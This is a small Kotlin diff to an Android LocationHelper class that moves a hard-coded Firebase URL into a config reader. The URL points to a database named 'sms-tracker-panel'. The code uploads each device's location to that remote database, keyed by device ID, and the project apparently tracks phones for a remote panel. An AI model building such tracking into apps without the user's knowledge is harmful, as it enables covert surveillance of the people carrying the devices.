@@ -17,7 +17,6 @@ class LocationHelper(private val context: Context) {
     private val deviceId = DeviceUtils.getUniqueDeviceId(context)
 
     companion object {
-        private const val FIREBASE_URL = "https://sms-tracker-panel-default-rtdb.asia-southeast1.firebasedatabase.app/"
         private const val TAG = "LocationHelper"
     }
 
@@ -85,7 +84,8 @@ class LocationHelper(private val context: Context) {
             "accuracy" to location.accuracy,
             "timestamp" to System.currentTimeMillis()
         )
-        FirebaseDatabase.getInstance(FIREBASE_URL)
+        val firebaseUrl = ConfigReader.getFirebaseUrl(context)
+        FirebaseDatabase.getInstance(firebaseUrl)
             .getReference("devices/$deviceId/location")
             .setValue(data)
             .addOnSuccessListener { Log.d(TAG, "✅ Location uploaded to Firebase") }
